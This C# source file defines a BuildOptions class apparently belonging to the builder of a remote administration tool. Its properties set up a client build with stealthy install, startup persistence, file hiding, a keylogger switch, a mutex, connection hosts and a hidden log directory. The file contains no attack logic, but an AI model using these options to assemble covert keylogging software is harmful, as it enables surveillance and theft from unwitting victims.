namespace xServer.Core.Data
{
    public class BuildOptions
    {
        public bool ValidationSuccess { get; set; }
        public bool Install { get; set; }
        public bool Startup { get; set; }
        public bool HideFile { get; set; }
        public bool Keylogger { get; set; }
        public string Tag { get; set; }
        public string Mutex { get; set; }
        public string RawHosts { get; set; }
        public string Password { get; set; }
        public string IconPath { get; set; }
        public string Version { get; set; }
        public string InstallSub { get; set; }
        public string InstallName { get; set; }
        public string StartupName { get; set; }
        public string OutputPath { get; set; }
        public int Delay { get; set; }
        public short InstallPath { get; set; }
        public string[] AssemblyInformation { get; set; }
        public string LogDirectoryName { get; set; }
        public bool HideLogDirectory { get; set; }
        public bool HideInstallSubdirectory { get; set; }
    }
}
